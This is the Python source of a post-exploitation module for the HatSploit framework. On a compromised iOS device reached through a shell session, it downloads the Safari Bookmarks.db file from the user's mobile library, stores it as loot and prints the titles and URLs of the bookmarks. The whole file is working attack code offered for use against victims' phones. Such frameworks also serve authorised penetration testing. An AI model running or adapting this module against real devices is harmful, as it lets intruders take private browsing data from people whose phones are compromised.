"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.loot import Loot
from hatsploit.lib.module.basic import *
from hatsploit.lib.sessions import Sessions

from pex.db import DB


class HatSploitModule(Module, Sessions, DB):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Category': "post",
            'Name': "Obtain Safari bookmarks",
            'Module': "post/apple_ios/shell/safari_bookmarks",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
            ],
            'Description': "Get iOS Safari bookmarks database and parse it.",
            'Platform': "apple_ios",
            'Rank': "medium",
        })

        self.session = SessionOption(None, "Session to run on.", True,
                                     platforms=['apple_ios'], type='shell')
        self.path = Option(Loot().specific_loot('Bookmarks.db'), "Path to save file.", True)

    def run(self):
        bookmarks = '/private/var/mobile/Library/Safari/Bookmarks.db'
        path = self.session_download(self.session.value, bookmarks, self.path.value)

        if path:
            self.print_process("Parsing bookmarks database...")

            try:
                bookmarks = self.parse_safari_bookmarks(path)
            except Exception:
                self.print_error("Failed to parse bookmarks database!")
                return

            bookmarks_data = []
            for item in bookmarks:
                bookmarks_data.append((item['title'], item['url']))

            if bookmarks_data:
                self.print_table("Bookmarks", ('Title', 'URL'), *bookmarks_data)
            else:
                self.print_warning("No bookmarks available on device.")
